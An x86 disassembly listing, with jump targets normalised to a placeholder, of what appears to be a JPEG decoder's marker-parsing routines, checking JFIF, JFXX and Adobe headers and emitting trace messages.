jne r-xdata
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x2 ]
cmp ecx 0x58
jne r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x3 ]
cmp edx 0x46
jne r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x3 ]
cmp eax 0x58
jne r-xdata
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x4 ]
test edx edx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x100 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov dl [ ecx + 0x5 ]
mov [ eax + 0x101 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov dl [ ecx + 0x6 ]
mov [ eax + 0x102 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov dl [ ecx + 0x7 ]
mov [ eax + 0x103 ] dl
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x9 ]
add ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x104 ] cx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0xa ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xb ]
add ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x106 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x101 ]
cmp ecx 0x1
je r-xdata
mov eax [ ebp + 0xc ]
mov cl [ eax + 0x5 ]
mov [ ebp - 0xc ] cl
cmp [ ebp - 0xc ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
add ecx 0x18
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x101 ]
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x102 ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0x104 ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + 0x106 ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x103 ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x57
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
xor ecx ecx
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x77
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x101 ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x102 ]
mov [ eax + 0x1c ] edx
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x6c
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
jmp r-xdata
cmp [ ebp - 0xc ] 0x11
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xc ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xd ]
or eax edx
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x6d
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
jmp r-xdata
cmp [ ebp - 0xc ] 0x13
je r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0xe
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xc ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xd ]
imul eax edx
imul eax eax 0x3
cmp [ ebp - 0x4 ] eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x5a
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xd ]
mov [ ecx + 0x1c ] eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x6e
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18 ] ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x58
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18 ] ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x59
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x5 ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x1c ] ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
sub_41b890
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
cmp [ ebp + 0x10 ] 0xc
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x4e
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x18 ] eax
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax ]
cmp ecx 0x41
jne r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x1 ]
cmp eax 0x64
jne r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x2 ]
cmp edx 0x6f
jne r-xdata
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x3 ]
cmp ecx 0x62
jne r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x4 ]
cmp eax 0x65
jne r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x5 ]
shl edx 0x8
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x6 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x7 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x8 ]
add eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x9 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xa ]
add ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xb ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
add ecx 0x18
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x4c
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x108 ] 0x1
mov edx [ ebp + 0x8 ]
mov al [ ebp - 0x10 ]
mov [ edx + 0x109 ] al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b9f0
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
sub eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov dl [ ecx ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x8 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x10 ] edx
xor al al
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x2
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x5b
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x17c ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x1c ] ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ edx ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
call [ eax + 0x10 ]
add esp 0x8
sub_41bb40
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x17c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0xfd
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x194 ]
xor eax eax
mov al [ edx + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x17c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
mov al [ ecx + lookup_table_41be9c ]
jmp [ eax * 4 + jump_table_41be58 ]
mov edx [ ebp + 0x8 ]
push edx
call sub_41af90
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41d920
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x17c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_41bfa0
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_41c0d0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
push 0x0
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41c0d0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
push 0x1
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_41c0d0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_41c0d0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x3c
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x17c ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41c700
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x55
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x17c ] 0x0
mov eax 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41b9f0
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41cc50
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_41d2a0
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41d720
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x17c ]
call [ eax + edx * 4 - 0x364 ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x194 ]
call [ edx + 0x18 ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x5c
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x17c ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41b9f0
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x17c ] 0x0
mov eax 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
sub_41bead
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
add [ ecx ] eax
add al [ ebx ]
add al 0x3
add eax [ ebx ]
add eax [ 0x3070306 ]
add eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx ] cl
or cl [ ebx ]
or al 0xd
adc [ eax ] dl
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
push cs
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
adc [ eax ] dl
bswap esp
int3
sub_41bfa0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x66
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
xor ecx ecx
mov cl [ eax + 0xc ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x14 ] 0xc9
je r-xdata
cmp [ ebp - 0x4 ] 0x10
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x3d
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ eax + 0xfc ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x28 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10a ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x100 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x101 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x102 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x103 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x104 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x106 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x108 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x109 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov [ eax + 0xc ] 0x1
mov al 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0xca ] 0x0
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx + 0xda ] 0x1
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0xea ] 0x5
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
sub_41c0d0
push ebp
mov ebp esp
sub esp 0x64
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ edx ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0xc ]
mov [ eax + 0xc8 ] cl
mov edx [ ebp + 0x8 ]
mov al [ ebp + 0x10 ]
mov [ edx + 0xc9 ] al
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x14 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x1c ]
sub edx 0x1
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
xor ecx ecx
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x1c ] eax
xor al al
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x1c ]
sub edx 0x1
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc0 ] ecx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
xor ecx ecx
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
xor al al
jmp r-xdata
mov edx [ ebp - 0x1c ]
sub edx 0x1
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
xor edx edx
test edx edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x14 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
xor al al
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x1c ] eax
xor al al
jmp r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x1
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x1c ]
sub edx 0x1
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
add eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
xor eax eax
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ edx ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x4 ]
